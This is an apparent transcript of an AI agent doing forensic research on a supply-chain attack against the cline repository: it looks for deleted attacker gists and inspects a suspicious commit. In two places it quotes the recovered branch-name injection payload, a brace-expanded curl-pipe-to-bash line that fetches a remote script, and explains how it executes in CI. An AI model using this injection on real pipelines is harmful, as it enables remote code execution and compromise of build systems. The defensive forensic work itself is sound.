+  &#34;prompt&#34;: &#34;Try to recover the deleted gists from glthub-actions via Wayback Machine.\n\nWorking directory: .out/oss-forensics-20260218_105712\n\nKnown deleted gist URLs to check:\n1. https://gist.github.com/glthub-actions/77f1c20a43be8f8bd047f31dce427207\n2. https://gist.github.com/glthub-actions/7b3f87dac75ef2249adeb6bdbc9ee3f1\n3. https://gist.github.com/glthub-actions/148eccfabb6a2c7410c6e2f2adee7889\n4. https://gist.github.com/glthub-actions/4f746a77ff66040b9b45c477d1be9295\n\nAlso check the raw URLs that were referenced in branch names:\n- https://gist.githubusercontent.com/glthub-actions/77f1c20a43be8f8bd047f31dce427207/raw/8bf62c75378429e193a64f29c10b3283253310cf/r.sh\n- https://gist.githubusercontent.com/glthub-actions/7b3f87dac75ef2249adeb6bdbc9ee3f1/raw/.../run.sh\n\nThese gists contained the actual malicious payloads. If Wayback captured them, we can see exactly what the attacker was trying to execute.&#34;
+}</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T17-02-04-077Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T17-02-04-077Z" class="timestamp-link"><time datetime="2026-02-18T17:02:04.077Z" data-timestamp="2026-02-18T17:02:04.077Z">2026-02-18T17:02:04.077Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>Now let me provide a summary report.
+
+## Wayback Machine Recovery Results
+
+### Summary
+
+**Recovery Status: UNSUCCESSFUL - No Archived Snapshots Found**
+
+I queried the Internet Archive&#x27;s Wayback Machine for all four deleted gists and their raw content URLs. None of these URLs have ever been archived.
+
+### URLs Searched
+
+**Gist Pages:**
+1. `https://gist.github.com/glthub-actions/77f1c20a43be8f8bd047f31dce427207` - No snapshots
+2. `https://gist.github.com/glthub-actions/7b3f87dac75ef2249adeb6bdbc9ee3f1` - No snapshots
+3. `https://gist.github.com/glthub-actions/148eccfabb6a2c7410c6e2f2adee7889` - No snapshots
+4. `https://gist.github.com/glthub-actions/4f746a77ff66040b9b45c477d1be9295` - No snapshots
+
+**Raw Content URLs:**
+- `https://gist.githubusercontent.com/glthub-actions/77f1c20a43be8f8bd047f31dce427207/raw/.../r.sh` - No snapshots
+- `https://gist.githubusercontent.com/glthub-actions/7b3f87dac75ef2249adeb6bdbc9ee3f1/raw/run.sh` - No snapshots
+
+**User Profile:**
+- `https://github.com/glthub-actions` - No snapshots
+- `https://gist.github.com/glthub-actions/*` (all user gists) - No snapshots
+
+### Search Methods Used
+
+1. CDX API exact match queries for each gist URL
+2. CDX API prefix match for all user gists
+3. CDX API prefix match for raw githubusercontent content
+4. Availability API checks for each specific URL
+5. Broader search patterns for any glthub-actions content
+
+### Forensic Implications
+
+The malicious gist payloads were **never captured** by the Wayback Machine before they were deleted. This is consistent with:
+
+- **Short-lived infrastructure**: The attacker deleted the gists quickly after use
+- **Anti-forensics OPSEC**: Deliberate removal of evidence before archiving
+- **Limited archive coverage**: Raw file content (`gist.githubusercontent.com`) is rarely archived by the Wayback Machine
+
+### Alternative Evidence Sources
+
+Since Wayback recovery failed, payload content must be recovered from:
+
+1. **GH Archive event payloads** - Branch names in CreateEvent/PushEvent contain the gist URLs
+2. **Victim workflow logs** - If the payloads executed, logs may contain output
+3. **Security vendor reports** - If any vendor captured the payload during analysis
+4. **Collaborating Burp Collaborator/OASTify logs** - The attacker&#x27;s C2 infrastructure
+
+### Evidence Updated
+
+Added negative finding to evidence store at:
+`/Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/evidence.json`
+
+Evidence ID: `wayback-gist-recovery-attempt`</pre><pre>agentId: ac24f08 (for resuming to continue this agent&#x27;s work if needed)</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T17-04-41-842Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T17-04-41-842Z" class="timestamp-link"><time datetime="2026-02-18T17:04:41.842Z" data-timestamp="2026-02-18T17:04:41.842Z">2026-02-18T17:04:41.842Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>The evidence has been collected and stored. Let me now provide a final summary report.
+
+## Summary: GH Archive Evidence Collection for glthub-actions
+
+### Critical Finding: GistEvents NOT in GH Archive
+
+**GH Archive does NOT capture GistEvents.** The GitHub Archive project only records repository-related events (PushEvent, IssuesEvent, PullRequestEvent, CreateEvent, DeleteEvent, ForkEvent, etc.). Gists are treated as separate entities in GitHub&#x27;s event system.
+
+**Available event types in GH Archive:**
+- CommitCommentEvent, CreateEvent, DeleteEvent, DiscussionEvent, ForkEvent, GollumEvent
+- IssueCommentEvent, IssuesEvent, MemberEvent, PublicEvent
+- PullRequestEvent, PullRequestReviewCommentEvent, PullRequestReviewEvent
+- PushEvent, ReleaseEvent, WatchEvent
+
+**GistEvent is NOT in this list.**
+
+### Evidence Recovered
+
+Despite the absence of GistEvents, I recovered significant evidence from the actor&#x27;s repository activity:
+
+**Events Collected: 35 total**
+- PushEvent: 9
+- IssuesEvent: 14
+- PullRequestEvent: 3
+- CreateEvent: 2 (with malicious branch names)
+- DeleteEvent: 1
+- ForkEvent: 2
+- IssueCommentEvent: 2
+
+**Key Discovery: Gist URL in Branch Names**
+
+The threat actor embedded the gist URL directly in branch names as a command injection payload:
+
+```
+{curl,-sSFL,gist.githubusercontent.com/glthub-actions/77f1c20a43be8f8bd047f31dce427207/raw/8bf62c75378429e193a64f29c10b3283253310cf/r.sh}${IFS}|${IFS}bash
+```
+
+This attack exploits:
+1. Bash brace expansion: `{curl,-sSFL,...}` expands to `curl -sSFL ...`
+2. `$IFS` (Internal Field Separator) to bypass space restrictions
+3. When a vulnerable CI system runs `git checkout $BRANCH`, it executes the payload
+
+**Gist Reference Found:**
+- Gist ID: `77f1c20a43be8f8bd047f31dce427207`
+- Filename: `r.sh`
+- Revision: `8bf62c75378429e193a64f29c10b3283253310cf`
+- Full URL: `https://gist.githubusercontent.com/glthub-actions/77f1c20a43be8f8bd047f31dce427207/raw/8bf62c75378429e193a64f29c10b3283253310cf/r.sh`
+
+**Other Gist IDs NOT Found in GH Archive:**
+- `7b3f87dac75ef2249adeb6bdbc9ee3f1` (run.sh) - No references
+- `148eccfabb6a2c7410c6e2f2adee7889` - No references
+- `4f746a77ff66040b9b45c477d1be9295` - No references
+
+### IOCs Added to Evidence Store
+
+| Type | Value | Description |
+|------|-------|-------------|
+| URL | `https://gist.githubusercontent.com/glthub-actions/77f1c20a43be8f8bd047f31dce427207/raw/.../r.sh` | Malicious payload URL |
+| file_hash | `77f1c20a43be8f8bd047f31dce427207` | Gist ID (r.sh) - VERIFIED in GH Archive |
+| username | `glthub-actions` | Threat actor (typosquatting github-actions) |
+| username | `256690727` | GitHub user ID |
+| file_hash | `7b3f87dac75ef2249adeb6bdbc9ee3f1` | Gist ID (run.sh) - NOT in GH Archive |
+| file_hash | `148eccfabb6a2c7410c6e2f2adee7889` | Gist ID - NOT in GH Archive |
+| file_hash | `4f746a77ff66040b9b45c477d1be9295` | Gist ID - NOT in GH Archive |
+
+### Files
+
+- Evidence store: `/Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/evidence.json`
+- Total evidence items: 40 (33 events + 7 IOCs)
+
+### Recommendations
+
+To recover the actual gist content (r.sh, run.sh):
+1. **Wayback Machine** - Query `web.archive.org` for cached snapshots of the gist URLs
+2. **GitHub Cache** - The raw content URLs may still be in CDN caches
+3. **Fork/Clone Analysis** - If anyone cloned or forked a repo containing the payload, the content may exist locally</pre><pre>agentId: a1de499 (for resuming to continue this agent&#x27;s work if needed)</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-04-52-832Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-04-52-832Z" class="timestamp-link"><time datetime="2026-02-18T17:04:52.832Z" data-timestamp="2026-02-18T17:04:52.832Z">2026-02-18T17:04:52.832Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>So the GH Archive doesn't capture GistEvents, and the Wayback Machine didn't archive the gists. But we do have some useful information:</p>
+<ol>
+<li>The branch name injection technique is confirmed - the gist URL was embedded in branch names</li>
+<li>We have the full URL: <code>https://gist.githubusercontent.com/glthub-actions/77f1c20a43be8f8bd047f31dce427207/raw/8bf62c75378429e193a64f29c10b3283253310cf/r.sh</code></li>
+<li>We know the filename was <code>r.sh</code></li>
+</ol>
+<p>Let me update the report with these findings about the branch name injection technique and the recovery attempts.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-04-55-107Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-04-55-107Z" class="timestamp-link"><time datetime="2026-02-18T17:04:55.107Z" data-timestamp="2026-02-18T17:04:55.107Z">2026-02-18T17:04:55.107Z</time></a></div><div class="message-content">
+<div class="assistant-text"><p>Key findings:</p>
+<p><strong>GH Archive doesn't capture GistEvents</strong> - only repo events. However, we DID recover the gist URL from branch names:</p>
+<p><strong>Branch Name Injection Payload (found in CreateEvent):</strong></p>
+<pre><code class="language-bash">{curl,-sSFL,gist.githubusercontent.com/glthub-actions/77f1c20a43be8f8bd047f31dce427207/raw/8bf62c75378429e193a64f29c10b3283253310cf/r.sh}${IFS}|${IFS}bash
+</code></pre>
+<p>This is a clever technique:
+- Bash brace expansion: <code>{curl,-sSFL,...}</code> → <code>curl -sSFL ...</code>
+- <code>${IFS}</code> bypasses space restrictions in branch names
+- When a vulnerable CI runs <code>git checkout $BRANCH</code>, it executes the payload</p>
+<p><strong>Wayback Machine:</strong> No snapshots found - attacker deleted gists too quickly.</p>
+<p>Let me check if the actual commits from glthub-actions' fork might still exist in the cline/cline object store (GitHub keeps fork commits even after fork deletion):</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-04-55-871Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-04-55-871Z" class="timestamp-link"><time datetime="2026-02-18T17:04:55.871Z" data-timestamp="2026-02-18T17:04:55.871Z">2026-02-18T17:04:55.871Z</time></a></div><div class="message-content">
+<div class="tool-use bash-tool" data-tool-id="toolu_01FfMPbbHje1NygkpckzJ7mD">
+<div class="tool-header"><span class="tool-icon">$</span> Bash</div>
+<div class="tool-description">Check if malicious commit exists in cline repo</div><div class="truncatable"><div class="truncatable-content"><pre class="bash-command">cd .out/oss-forensics-20260218_105712/repos/cline.git &amp;&amp; git cat-file -p b181e045989a73e4f9bd6731b08df66ef1c079ac 2&gt;/dev/null || echo &#34;Commit not found in local clone&#34;</pre></div><button class="expand-btn">Show more</button></div>
+</div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-04-57-123Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-04-57-123Z" class="timestamp-link"><time datetime="2026-02-18T17:04:57.123Z" data-timestamp="2026-02-18T17:04:57.123Z">2026-02-18T17:04:57.123Z</time></a></div><div class="message-content">
+<div class="tool-use bash-tool" data-tool-id="toolu_011YuYiADusE8CVhzvLRCyUc">
+<div class="tool-header"><span class="tool-icon">$</span> Bash</div>
+<div class="tool-description">Try to fetch malicious commit via GitHub API</div><div class="truncatable"><div class="truncatable-content"><pre class="bash-command">gh api repos/cline/cline/commits/b181e045989a73e4f9bd6731b08df66ef1c079ac 2&gt;/dev/null | head -50 || echo &#34;Commit not accessible via API&#34;</pre></div><button class="expand-btn">Show more</button></div>
+</div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T17-05-04-384Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T17-05-04-384Z" class="timestamp-link"><time datetime="2026-02-18T17:05:04.384Z" data-timestamp="2026-02-18T17:05:04.384Z">2026-02-18T17:05:04.384Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>Commit not found in local clone</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T17-05-05-829Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T17-05-05-829Z" class="timestamp-link"><time datetime="2026-02-18T17:05:05.829Z" data-timestamp="2026-02-18T17:05:05.829Z">2026-02-18T17:05:05.829Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>{&quot;sha&quot;:&quot;b181e045989a73e4f9bd6731b08df66ef1c079ac&quot;,&quot;node_id&quot;:&quot;C_kwDOMSqWwdoAKGIxODFlMDQ1OTg5YTczZTRmOWJkNjczMWIwOGRmNjZlZjFjMDc5YWM&quot;,&quot;commit&quot;:{&quot;author&quot;:{&quot;name&quot;:&quot;glthub-actions&quot;,&quot;email&quot;:&quot;sec@w00.sh&quot;,&quot;date&quot;:&quot;2026-01-28T03:41:00Z&quot;},&quot;committer&quot;:{&quot;name&quot;:&quot;GitHub&quot;,&quot;email&quot;:&quot;noreply@github.com&quot;,&quot;date&quot;:&quot;2026-01-28T03:41:00Z&quot;},&quot;message&quot;:&quot;Update package.json&quot;,&quot;tree&quot;:{&quot;sha&quot;:&quot;1bb1529d29e03f5e067020c284531ed3ce665ac8&quot;,&quot;url&quot;:&quot;https://api.github.com/repos/cline/cline/git/trees/1bb1529d29e03f5e067020c284531ed3ce665ac8&quot;},&quot;url&quot;:&quot;https://api.github.com/repos/cline/cline/git/commits/b181e045989a73e4f9bd6731b08df66ef1c079ac&quot;,&quot;comment_count&quot;:0,&quot;verification&quot;:{&quot;verified&quot;:true,&quot;reason&quot;:&quot;valid&quot;,&quot;signature&quot;:&quot;-----BEGIN PGP SIGNATURE-----\n\nwsFcBAABCAAQBQJpeYVMCRC1aQ7uu5UhlAAAoMQQAFXIJ6M7mzU7odhrX8qaeMF8\nOyKqZwcjh3e0MDBwqsAv4e4brZew3Hmeioe5623VwKJ+x6iFkgni6C97yr51RxmT\nLPr7F9qiq6I4KKIfWp0qdJkUHPdjBidWv3sjiPFt0ViQfm6S2JOfJh0IgkQKega2\nDBAcJTpgMarsyIPorJ6C0xvqyfeWKKON/9DH0lbhrl+s/oNWjETaBORycAZgyjZn\nONId/6JEQjo386OiL2BI3GQPuK74l16DSLinpxnWQVHg3eLgmGM/crF+h6slz9mk\nCAJb4z/97XuoGkTA1VfZP8gvw9K8j7eIOcfHEw8n4hAaCwbeNkVLt8uLwr0VXViX\nohvUVSaSjIVrpMbVzcWO0WeiD7/ytPxyAIqQ9LTTyQZa94tqooda8PEKU5lJ5tUV\nLdELHCRoMMXT9Xcz44uqjLKlmkbE5vK8XaoEfeXFVUpIyDJf4FzaO2xBDzqJHdmm\nZwQOBqNUZeb88pqJPzHn5yx+jvKOFdRG/o1/a8voe1oFCTxjBhiBnEYftBtaptzB\npFYyWttgimnsh28gBWbodgQCov6i0aTDfK6PM4RM15cmZmvwjGWsYp7y9XHHuVO8\nfsIoKuSWJfsVAf5yZaGMb2cLt5nTNY11GY3H0RZWqwnJ/ez7QhG4Jcmhxie6fWO+\nnF7Oaqm45tKKjTSRoU44\n=bh33\n-----END PGP SIGNATURE-----\n&quot;,&quot;payload&quot;:&quot;tree 1bb1529d29e03f5e067020c284531ed3ce665ac8\nparent 06b05ddfe909ce47c146f05eb7d08366b56ecbe0\nauthor glthub-actions &lt;sec@w00.sh&gt; 1769571660 -0500\ncommitter GitHub &lt;noreply@github.com&gt; 1769571660 -0500\n\nUpdate package.json&quot;,&quot;verified_at&quot;:&quot;2026-01-28T03:41:01Z&quot;}},&quot;url&quot;:&quot;https://api.github.com/repos/cline/cline/commits/b181e045989a73e4f9bd6731b08df66ef1c079ac&quot;,&quot;html_url&quot;:&quot;https://github.com/cline/cline/commit/b181e045989a73e4f9bd6731b08df66ef1c079ac&quot;,&quot;comments_url&quot;:&quot;https://api.github.com/repos/cline/cline/commits/b181e045989a73e4f9bd6731b08df66ef1c079ac/comments&quot;,&quot;author&quot;:null,&quot;committer&quot;:{&quot;login&quot;:&quot;web-flow&quot;,&quot;id&quot;:19864447,&quot;node_id&quot;:&quot;MDQ6VXNlcjE5ODY0NDQ3&quot;,&quot;avatar_url&quot;:&quot;https://avatars.githubusercontent.com/u/19864447?v=4&quot;,&quot;gravatar_id&quot;:&quot;&quot;,&quot;url&quot;:&quot;https://api.github.com/users/web-flow&quot;,&quot;html_url&quot;:&quot;https://github.com/web-flow&quot;,&quot;followers_url&quot;:&quot;https://api.github.com/users/web-flow/followers&quot;,&quot;following_url&quot;:&quot;https://api.github.com/users/web-flow/following{/other_user}&quot;,&quot;gists_url&quot;:&quot;https://api.github.com/users/web-flow/gists{/gist_id}&quot;,&quot;starred_url&quot;:&quot;https://api.github.com/users/web-flow/starred{/owner}{/repo}&quot;,&quot;subscriptions_url&quot;:&quot;https://api.github.com/users/web-flow/subscriptions&quot;,&quot;organizations_url&quot;:&quot;https://api.github.com/users/web-flow/orgs&quot;,&quot;repos_url&quot;:&quot;https://api.github.com/users/web-flow/repos&quot;,&quot;events_url&quot;:&quot;https://api.github.com/users/web-flow/events{/privacy}&quot;,&quot;received_events_url&quot;:&quot;https://api.github.com/users/web-flow/received_events&quot;,&quot;type&quot;:&quot;User&quot;,&quot;user_view_type&quot;:&quot;public&quot;,&quot;site_admin&quot;:false},&quot;parents&quot;:[{&quot;sha&quot;:&quot;06b05ddfe909ce47c146f05eb7d08366b56ecbe0&quot;,&quot;url&quot;:&quot;https://api.github.com/repos/cline/cline/commits/06b05ddfe909ce47c146f05eb7d08366b56ecbe0&quot;,&quot;html_url&quot;:&quot;https://github.com/cline/cline/commit/06b05ddfe909ce47c146f05eb7d08366b56ecbe0&quot;}],&quot;stats&quot;:{&quot;total&quot;:637,&quot;additions&quot;:5,&quot;deletions&quot;:632},&quot;files&quot;:[{&quot;sha&quot;:&quot;6696e7e3ba2084d1970d9f7aded7ed5773bb8384&quot;,&quot;filename&quot;:&quot;package.json&quot;,&quot;status&quot;:&quot;modified&quot;,&quot;additions&quot;:5,&quot;deletions&quot;:632,&quot;changes&quot;:637,&quot;blob_url&quot;:&quot;https://github.com/cline/cline/blob/b181e045989a73e4f9bd6731b08df66ef1c079ac/package.json&quot;,&quot;raw_url&quot;:&quot;https://github.com/cline/cline/raw/b181e045989a73e4f9bd6731b08df66ef1c079ac/package.json&quot;,&quot;contents_url&quot;:&quot;https://api.github.com/repos/cline/cline/contents/package.json?ref=b181e045989a73e4f9bd6731b08df66ef1c079ac&quot;,&quot;patch&quot;:&quot;@@ -1,634 +1,7 @@\n {\n-\t\&quot;name\&quot;: \&quot;claude-dev\&quot;,\n-\t\&quot;displayName\&quot;: \&quot;Cline\&quot;,\n-\t\&quot;description\&quot;: \&quot;Autonomous coding agent right in your IDE, capable of creating/editing files, running commands, using the browser, and more with your permission every step of the way.\&quot;,\n-\t\&quot;version\&quot;: \&quot;3.55.0\&quot;,\n-\t\&quot;icon\&quot;: \&quot;assets/icons/icon.png\&quot;,\n-\t\&quot;engines\&quot;: {\n-\t\t\&quot;vscode\&quot;: \&quot;^1.84.0\&quot;\n-\t},\n-\t\&quot;author\&quot;: {\n-\t\t\&quot;name\&quot;: \&quot;Cline Bot Inc.\&quot;\n-\t},\n-\t\&quot;license\&quot;: \&quot;Apache-2.0\&quot;,\n-\t\&quot;publisher\&quot;: \&quot;saoudrizwan\&quot;,\n-\t\&quot;repository\&quot;: {\n-\t\t\&quot;type\&quot;: \&quot;git\&quot;,\n-\t\t\&quot;url\&quot;: \&quot;https://github.com/cline/cline\&quot;\n-\t},\n-\t\&quot;homepage\&quot;: \&quot;https://cline.bot\&quot;,\n-\t\&quot;categories\&quot;: [\n-\t\t\&quot;AI\&quot;,\n-\t\t\&quot;Chat\&quot;,\n-\t\t\&quot;Programming Languages\&quot;,\n-\t\t\&quot;Education\&quot;,\n-\t\t\&quot;Snippets\&quot;,\n-\t\t\&quot;Testing\&quot;\n-\t],\n-\t\&quot;keywords\&quot;: [\n-\t\t\&quot;cline\&quot;,\n-\t\t\&quot;claude\&quot;,\n-\t\t\&quot;dev\&quot;,\n-\t\t\&quot;mcp\&quot;,\n-\t\t\&quot;openrouter\&quot;,\n-\t\t\&quot;coding\&quot;,\n-\t\t\&quot;agent\&quot;,\n-\t\t\&quot;autonomous\&quot;,\n-\t\t\&quot;chatgpt\&quot;,\n-\t\t\&quot;sonnet\&quot;,\n-\t\t\&quot;ai\&quot;,\n-\t\t\&quot;llama\&quot;\n-\t],\n-\t\&quot;activationEvents\&quot;: [\n-\t\t\&quot;onLanguage\&quot;,\n-\t\t\&quot;onStartupFinished\&quot;,\n-\t\t\&quot;workspaceContains:evals.env\&quot;\n-\t],\n-\t\&quot;main\&quot;: \&quot;./dist/extension.js\&quot;,\n-\t\&quot;contributes\&quot;: {\n-\t\t\&quot;icons\&quot;: {\n-\t\t\t\&quot;cline-icon\&quot;: {\n-\t\t\t\t\&quot;description\&quot;: \&quot;cline\&quot;,\n-\t\t\t\t\&quot;default\&quot;: {\n-\t\t\t\t\t\&quot;fontPath\&quot;: \&quot;assets/icons/cline-bot.woff\&quot;,\n-\t\t\t\t\t\&quot;fontCharacter\&quot;: \&quot;\\\\e900\&quot;\n-\t\t\t\t}\n-\t\t\t}\n-\t\t},\n-\t\t\&quot;walkthroughs\&quot;: [\n-\t\t\t{\n-\t\t\t\t\&quot;id\&quot;: \&quot;ClineWalkthrough\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Meet Cline, your new coding partner\&quot;,\n-\t\t\t\t\&quot;description\&quot;: \&quot;Cline codes like a developer because it thinks like one. Here are 5 ways to put it to work:\&quot;,\n-\t\t\t\t\&quot;steps\&quot;: [\n-\t\t\t\t\t{\n-\t\t\t\t\t\t\&quot;id\&quot;: \&quot;welcome\&quot;,\n-\t\t\t\t\t\t\&quot;title\&quot;: \&quot;Start with a Goal, Not Just a Prompt\&quot;,\n-\t\t\t\t\t\t\&quot;description\&quot;: \&quot;Tell Cline what you want to achieve. It plans, asks, and then codes, like a true partner.\&quot;,\n-\t\t\t\t\t\t\&quot;media\&quot;: {\n-\t\t\t\t\t\t\t\&quot;markdown\&quot;: \&quot;walkthrough/step1.md\&quot;\n-\t\t\t\t\t\t}\n-\t\t\t\t\t},\n-\t\t\t\t\t{\n-\t\t\t\t\t\t\&quot;id\&quot;: \&quot;learn\&quot;,\n-\t\t\t\t\t\t\&quot;title\&quot;: \&quot;Let Cline Learn Your Codebase\&quot;,\n-\t\t\t\t\t\t\&quot;description\&quot;: \&quot;Point Cline to your project. It builds understanding to make smart, context-aware changes.\&quot;,\n-\t\t\t\t\t\t\&quot;media\&quot;: {\n-\t\t\t\t\t\t\t\&quot;markdown\&quot;: \&quot;walkthrough/step2.md\&quot;\n-\t\t\t\t\t\t}\n-\t\t\t\t\t},\n-\t\t\t\t\t{\n-\t\t\t\t\t\t\&quot;id\&quot;: \&quot;advanced-features\&quot;,\n-\t\t\t\t\t\t\&quot;title\&quot;: \&quot;Always Use the Best AI Models\&quot;,\n-\t\t\t\t\t\t\&quot;description\&quot;: \&quot;Cline empowers you with State-of-the-Art AI, connecting to top models (Anthropic, Gemini, OpenAI &amp; more).\&quot;,\n-\t\t\t\t\t\t\&quot;media\&quot;: {\n-\t\t\t\t\t\t\t\&quot;markdown\&quot;: \&quot;walkthrough/step3.md\&quot;\n-\t\t\t\t\t\t}\n-\t\t\t\t\t},\n-\t\t\t\t\t{\n-\t\t\t\t\t\t\&quot;id\&quot;: \&quot;mcp\&quot;,\n-\t\t\t\t\t\t\&quot;title\&quot;: \&quot;Extend with Powerful Tools (MCP)\&quot;,\n-\t\t\t\t\t\t\&quot;description\&quot;: \&quot;Connect to databases, APIs, or discover new capabilities in the MCP Marketplace.\&quot;,\n-\t\t\t\t\t\t\&quot;media\&quot;: {\n-\t\t\t\t\t\t\t\&quot;markdown\&quot;: \&quot;walkthrough/step4.md\&quot;\n-\t\t\t\t\t\t}\n-\t\t\t\t\t},\n-\t\t\t\t\t{\n-\t\t\t\t\t\t\&quot;id\&quot;: \&quot;getting-started\&quot;,\n-\t\t\t\t\t\t\&quot;title\&quot;: \&quot;You&#x27;re Always in Control\&quot;,\n-\t\t\t\t\t\t\&quot;description\&quot;: \&quot;Review Cline&#x27;s plans and diffs. Approve changes before they happen. No surprises.\&quot;,\n-\t\t\t\t\t\t\&quot;media\&quot;: {\n-\t\t\t\t\t\t\t\&quot;markdown\&quot;: \&quot;walkthrough/step5.md\&quot;\n-\t\t\t\t\t\t},\n-\t\t\t\t\t\t\&quot;content\&quot;: {\n-\t\t\t\t\t\t\t\&quot;path\&quot;: \&quot;walkthrough/step5.md\&quot;\n-\t\t\t\t\t\t}\n-\t\t\t\t\t}\n-\t\t\t\t]\n-\t\t\t}\n-\t\t],\n-\t\t\&quot;viewsContainers\&quot;: {\n-\t\t\t\&quot;activitybar\&quot;: [\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;id\&quot;: \&quot;claude-dev-ActivityBar\&quot;,\n-\t\t\t\t\t\&quot;title\&quot;: \&quot;Cline\&quot;,\n-\t\t\t\t\t\&quot;icon\&quot;: \&quot;assets/icons/icon.svg\&quot;\n-\t\t\t\t}\n-\t\t\t]\n-\t\t},\n-\t\t\&quot;views\&quot;: {\n-\t\t\t\&quot;claude-dev-ActivityBar\&quot;: [\n-\t\t\t\t{\n-\t\t\t\t\t\&quot;type\&quot;: \&quot;webview\&quot;,\n-\t\t\t\t\t\&quot;id\&quot;: \&quot;claude-dev.SidebarProvider\&quot;,\n-\t\t\t\t\t\&quot;name\&quot;: \&quot;\&quot;,\n-\t\t\t\t\t\&quot;icon\&quot;: \&quot;assets/icons/icon.svg\&quot;\n-\t\t\t\t}\n-\t\t\t]\n-\t\t},\n-\t\t\&quot;commands\&quot;: [\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.plusButtonClicked\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;New Task\&quot;,\n-\t\t\t\t\&quot;icon\&quot;: \&quot;$(add)\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.mcpButtonClicked\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;MCP Servers\&quot;,\n-\t\t\t\t\&quot;icon\&quot;: \&quot;$(server)\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.historyButtonClicked\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;History\&quot;,\n-\t\t\t\t\&quot;icon\&quot;: \&quot;$(history)\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.accountButtonClicked\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Account\&quot;,\n-\t\t\t\t\&quot;icon\&quot;: \&quot;$(account)\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.settingsButtonClicked\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Settings\&quot;,\n-\t\t\t\t\&quot;icon\&quot;: \&quot;$(settings-gear)\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.dev.createTestTasks\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Create Test Tasks\&quot;,\n-\t\t\t\t\&quot;category\&quot;: \&quot;Cline\&quot;,\n-\t\t\t\t\&quot;when\&quot;: \&quot;cline.isDevMode\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.dev.expireMcpOAuthTokens\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Expire MCP OAuth Tokens (for testing)\&quot;,\n-\t\t\t\t\&quot;category\&quot;: \&quot;Cline\&quot;,\n-\t\t\t\t\&quot;when\&quot;: \&quot;cline.isDevMode\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.addToChat\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Add to Cline\&quot;,\n-\t\t\t\t\&quot;category\&quot;: \&quot;Cline\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.addTerminalOutputToChat\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Add to Cline\&quot;,\n-\t\t\t\t\&quot;category\&quot;: \&quot;Cline\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.focusChatInput\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Jump to Chat Input\&quot;,\n-\t\t\t\t\&quot;category\&quot;: \&quot;Cline\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.generateGitCommitMessage\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Generate Commit Message with Cline\&quot;,\n-\t\t\t\t\&quot;category\&quot;: \&quot;Cline\&quot;,\n-\t\t\t\t\&quot;icon\&quot;: \&quot;$(cline-icon)\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: \&quot;cline.abortGitCommitMessage\&quot;,\n-\t\t\t\t\&quot;title\&quot;: \&quot;Generate Commit Message with Cline - Stop\&quot;,\n-\t\t\t\t\&quot;category\&quot;: \&quot;Cline\&quot;,\n-\t\t\t\t\&quot;icon\&quot;: \&quot;$(debug-stop)\&quot;\n-\t\t\t},\n-\t\t\t{\n-\t\t\t\t\&quot;command\&quot;: 